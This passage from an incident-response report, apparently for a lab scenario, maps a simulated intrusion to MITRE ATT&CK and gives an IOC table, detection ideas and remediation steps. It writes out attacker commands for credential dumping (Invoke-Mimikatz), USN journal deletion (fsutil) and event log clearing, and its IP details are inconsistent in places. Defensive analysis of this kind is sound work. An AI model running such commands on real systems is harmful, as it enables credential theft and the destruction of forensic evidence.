| **USN** | `Staged.zip` directory created on the system. |
| **Event 4103** | The `Compress-Archive` command executed against the staged directory to compress collected files. |
| **Pcapng** | The staged directory archive was exfiltrated to the C2 server `/file/upload` endpoint over HTTP protocol. SMTP session initiated TLS encryption immediately prior to the exfiltration log generation. |
| **Event ID11** | Exfiltration log `exfiltration_report_BLUEDELTA_20260705_134744.txt` generated. |

## 2.8. Persistence  
No persistence mechanisms were identified.

## 2.9. Command and control :

| **Evidence source** | **Findings** |
|---|---|
| **Pcapng file** | Persistent C2 beaconing was identified between the Caldera agent `192.168.67.129` and the deployed server `192.168.67.128` at a consistent one-minute interval. |

## 2.10. Event log clearing :

| **Evidence source** | **Findings** |
|---|---|
| **Windows Event 1102** | Security event log cleared. |
| **Windows Event 104** | System event log cleared. |
| **Sysmon Event ID 5** | `wevtutil.exe` process terminated. Absence of the corresponding `wevtutil.exe` process creation event was observed. |

# 3.Attack timeline and Mitre attack mapping:

## Attack Timeline

| Timeline | Activity | Tactic | MITRE ATT&CK Technique | Evidence |
|---|---|---|---|---|
| **ATTACK 1** | | | | |
| 06:13:27 UTC | `splunkd.exe` executed from an unexpected location, masquerading as a legitimate Splunk program. | Execution | T1204.002 – User Execution: Malicious File<br>T1036.005 – Masquerading: Match Legitimate Resource Name or Location | Amcache |
| 06:38:45 UTC | `anmar_hacking.exe` agent executed from a shared directory. | Execution | T1204.002 – User Execution: Malicious File | Amcache |
| 07:17:24 UTC – 08:44:56 UTC | Persistent C2 beaconing observed from the Caldera agent `192.168.67.129` to the deployed C2 server `192.168.67.128` at a consistent interval. | Command and Control | T1071 – Command and Control | Pcapng file |
| 07:27:10 UTC | LSASS memory accessed by `anmar_hacking.exe`. | Credential Access | T1003.001 – OS Credential Dumping: LSASS Memory | Event ID 1 |
| 08:02:58 UTC | `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value` command executed to enumerate installed antivirus software. | Discovery | T1518.001 – Security Software Discovery | Event ID 1<br>Prefetch |
| 08:05:44 UTC | Sensitive files were identified and staged for exfiltration. | Collection | T1005 – Data from Local System | Event 400, 600, 403 |
| 08:12:41 UTC | `Debug.exe` masqueraded as the PowerShell utility. `Debug.exe` was used to perform reconnaissance activity, including process, local account, local group, and registry discovery. | Discovery | T1036.003 – Masquerading: Rename System Utilities<br>T1059.001 – Command and Scripting Interpreter: PowerShell<br>T1057 – Process Discovery<br>T1087.001 – Account Discovery: Local Account<br>T1069.001 – Permission Groups Discovery: Local Groups<br>T1012 – Query Registry | Amcache<br>PowerShell Event Logs (400, 600, 403)<br>Prefetch<br>Debug.log |
| 08:13:32 UTC | Security and System event logs deleted. | Defense Evasion | T1070.001 – Clear Windows Event Logs | Event 104, 1102 |
| 08:19:42 UTC | NTFS USN Journal change records deleted using `fsutil`. | Stealth | T1070 – Indicator Removal | Amcache |
| 08:27:45 UTC | Collected files stored in the staged directory were compressed. | Exfiltration | T1560.001 – Archive Collected Data: Archive via Utility | USN<br>Event 4103 |
| 08:28:31 UTC | Staged archive exfiltrated to the C2 server over HTTP. | Exfiltration | T1041 – Exfiltration Over C2 Channel | Pcapng |
| **ATTACK 2** | | | | |
| 08:46:54 UTC | Administrative logon identified for the `anmar` user, allowing the user to obtain an elevated security token. | Privilege Escalation | T1134 – Access Token Manipulation | Event 4672 |
| 08:47:44 UTC | `NulltacKatz_v1.3.py` executed. | Execution | T1204.002 – User Execution: Malicious File | Event ID 1<br>Prefetch |
| 08:48:09 UTC | Phishing email artifact logged on the system. | Initial Access | T1566.001 – Phishing: Spearphishing Attachment | Logs<br>USN |
| 08:48:09 UTC | `net user` command executed to enumerate local users. | Discovery | T1087 – Account Discovery | Event ID 1<br>USN<br>Prefetch |
| 08:48:09 UTC | `ipconfig` command executed to enumerate network configuration. | Discovery | T1016 – System Network Configuration Discovery | Event ID 1<br>USN<br>Prefetch |
| 08:48:09 UTC | `tasklist` command executed to enumerate running processes. | Discovery | T1057 – Process Discovery | Event ID 1<br>USN<br>Prefetch |
| 08:49:09 UTC | LSASS memory accessed by `mimikatz.exe`. | Credential Access | T1003.001 – OS Credential Dumping: LSASS Memory | Event ID 10<br>Prefetch |
| 08:49:12 UTC | Generation of the exfiltration log was preceded by an SMTP session that successfully initiated TLS encryption. | Exfiltration (Not Confirmed) | T1048 – Exfiltration Over Alternative Protocol | Event ID 11<br>Pcapng |

# 4.IOCs:
| IOC | Value |
|---|---|
| **IPs** | 192.168.76.128 C2 server<br><br>192.168.76.129 IP of the compromised host<br><br>173.174.222.108 suspicious mail server |
| **Domains** | security@payroll-update.com<br><br>it-security@noreply.com |
| **Ports** | 8888 port used by C2 server<br><br>587: SMTP port used for exfiltration |
| **URLs** | http://192.168.67.128:8888/beacon: was used by C2 for beaconing<br><br>http://192.168.67.128:8888/file/upload: used for exfiltration of collected files |
| **Compromised account** | Anmar user account<br><br>Anmar gmail account |
| **Masquerading location** | C:\windows\system32\staged |
| **Masquerading utility** | Powershell.exe renamed debug.exe |
| **Windows utility run from temp location** | C:\windows\temp\debug.exe |
| **Masquerading legitimate program** | Splunkd.Exe |
| **Credential dump command** | Invoke-Mimikatz -DumpCreds |
| **USN journal clearing** | fsutil usn deletejournal /D C: |
| **Event log clearing command** | clear-eventlog security<br>clear-eventlog system |
| **Phishing email** | phishing_email_BLUEDELTA_20260705_134744.txt |
| **Exfiltration report** | exfiltration_report_BLUEDELTA_20260705_134744.txt |
| **Files** | Name: staged.zip<br>Size: 155287 bytes<br>MD5: 8d0c86ad97a3db24907982a5aa11f75d<br>SHA1: 12c93eacfa544c4476a26045575c44540415dc76<br><br>Name: splunkd.exe<br>SHA1: 84b3ad73cfa4654fcdafd162a0cb1527c4bad510<br><br>Name: anmar_hacking.exe<br>Size: 7817728 bytes<br>SHA1: 90b54b721c6a06e80377b2000db7195c62c3d19d<br><br>Name: NulltacKatz_v1.3.py<br>SHA256: CCE21C0E8710E304273E98AC4B2B0F5ACEB639ACBCD2343CBAA5C4E81619C45B<br><br>Name: mimikatz.exe<br>SHA256: 92804FAAAB2175DC501D73E814663058C78C0A042675A8937266357BCFB96C50 |
| **Affected assets** | Hostname: DESKTOP-2A1O8LD<br><br>Operating system: Windows |

# 5.Detection rule

<img width="945" height="280" alt="image" src="https://github.com/user-attachments/assets/d50f0f89-798a-482e-8b6c-135b8d0ce6b7" /><br>

# 6.Recommendations

##### Containment 
-	Isolate the DESKTOP-2A1O8LD machine from the network using Microsoft defender to prevent further spread
-	Block the attacker’s IP 192.168.67.128 from the firewall to prevent outgoing and incoming traffic from the attacker 
-	Block the C2 server IP 192.168.67.129 to stop communication with the server
-	Disable anmar account
#### Eradication 
-	Reset anmar credentials 
-	Change email password to a long and unique password  
-	Enable MFA multi-factor authentication
-	Delete anmar_hacking.exe, splund.exe and  NulltackKatz_V1.3.py from the system 
##### Initial access 
-	Block security@payroll-update.com and it-security@noreply.com from the email security gateway
-	Implement email authentication protocol SPF,DKIM and DMARC to prevent spoofing
-	Perform user awareness training to educate people recognizing spearphishing techniques
-	Monitor .py file creation event (Sysmon ID11 ) by powershell.exe or cmd.exe process  correlated with python.exe process creation (sysmon ID1). Correlate this activity with email delivery to confirm the initial access						
##### Execution
-	Implement Microsoft defender Attack Surface Reduction (ASR) rule ‘Block executable files from running unless they meet a prevalence, age, or trusted list criterion’,  to prevent the untrusted execution such as anmar_hacking.exe and splunkd.exe
-	Monitor process creation (sysmon ID1 and 4688) of any .exe  process executed from   C:\Users\Public location where the parent process powershell.exe or cmd.exe 
##### Discovery 
-	Monitor process creation (sysmon ID1 and 4688) where:
o	Image cmd.exe
o	parent image py.exe  or python.exe
o	commandline contains (net user, ipconfig /all and tasklist)
-	Monitor process creation (sysmon ID1 and 4688) of wmic.exe where command line contains \root\securitycenter or \root\securitycenter2
##### Masquerading:
-	Monitor process creation (sysmon EID1 and 4688) where the original filename filed doesn’t match the Image filename field (debug.exe  powershell.exe)
Indicator removal 
-	Monitor process creation (sysmon ED1 and 4688) of fsutil.exe where commandline contains usn delete
###### Privilege escalation 
-	Apply least privilege principle to restrict users and accounts to the least privilege they require(remove anmar from administrator group) 
-	Implement PAM(Privileged Access Management) to restrict privileged access and prevent unauthorized users or groups from creating privileged token
##### Credential access
-	Enable LSA (Local Security authority) protection (provided to prevent nonprotected processes from reading memory and injecting code) with Credential guard ( prevents attempts to extract credentials from LSASS
##### Exfiltration 
-	Monitor powershell.exe process creation events (event ID1, 4688)containing compress-archive commandline correlated with file creation event for .zip 
-	Monitor and alert on outbound connection to 192.168.67.128:8888 using Suricata rules
-	Monitor and alert on outbound communications including file transmission activity over SMTP port 587, initiated by python.exe or py.exe process using sysmon or suricata rules
Command and control
-	Implement behavioral anomaly detection that help detect abnormal beaconing pattern
#### Lessons learned 
-	Regular user awareness training should be performed to educate people identifying and recognizing phishing emails, as phishing was identifying the initial attack vector in this incident. 
-	Attackers may attempt to hide their traces by removing or modifying targeted forensic artifacts such as events log, usn journal and masquerading standard windows utility(cmd.exe or powershell.exe).Correlating multiple artifacts from various sources is essential to reconstruct the attack timeline (one artifact can lie, multiple artifacts agreeing)

# 6.KG

<img width="4450" height="2368" alt="GoldenPhantom cyber kill chain mapping" src="https://github.com/user-attachments/assets/196b6528-f8a7-4922-a5d1-a5f30df9ef1d" /><br>


# Conclusion 
All tasks were successfully performed and completed during this scenario.

| Deliverable | Status |
|---|---|
| Full incident report mapping each artifact to a MITRE ATT&CK technique | Delivered |
| Timeline of the attack (creation, execution, exfiltration) | Delivered |
| Sysmon event log analysis (Filtered for LSASS access) | Delivered |
| Detection rule for a specific technique | Delivered |
| Screenshots of key evidence (Event IDs, registry modifications, file creations) | Delivered |
| One-page executive summary for non-technical stakeholders | Delivered |
| Evidence log with all hash values | Delivered |
























































